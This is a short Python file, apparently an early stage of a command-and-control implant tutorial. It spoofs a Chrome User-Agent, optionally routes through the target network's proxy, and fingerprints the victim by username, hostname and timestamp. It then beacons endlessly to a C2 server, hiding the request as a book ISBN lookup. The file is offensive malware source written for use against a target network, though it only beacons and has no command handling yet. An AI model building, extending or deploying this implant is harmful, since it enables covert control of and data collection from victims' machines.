# Command and Control client Code

from os import getenv
from time import time
from requests import get
from sys import platform
from os import uname

# Keep the User-Agent look like a modern browser
HEADER = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/557.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded",
    "Accept": "text/plain"
}

# Set a proxy to match what your target network will be using, if you know it
# PROXY = None {"https": "proxy.some-site.com:443"}
PROXY = None

# Port c2 server listens on
PORT = 80

# Set the c2 server's IP address or hostname
C2_SERVER = "localhost"

# Path to use for signifying a command request form a client using HTTP GET
CMD_REQUEST = "/book?isbn="

# Obtain unique identifiying information
if getenv("OS") == "Windows_NT":
    client = getenv("USERNAME", "") + "@" + getenv("COMPUTERNAME", "") + "@" + str(time())
elif platform == "linux" or platform == "linux2":
    client = getenv("USER", "") + "@" + uname().nodename + "@" + str(time())
elif platform == "darwin":
    client = getenv("USER", "") + "@" + uname().nodename + "@" + str(time())
else:
    client = "unknown" + "@" + "unknown" + "@" + str(time())

while True:
    x = get(url=f"http://{C2_SERVER}:{PORT}{CMD_REQUEST}{client}", headers=HEADER, proxies=PROXY)
    print(x.status_code)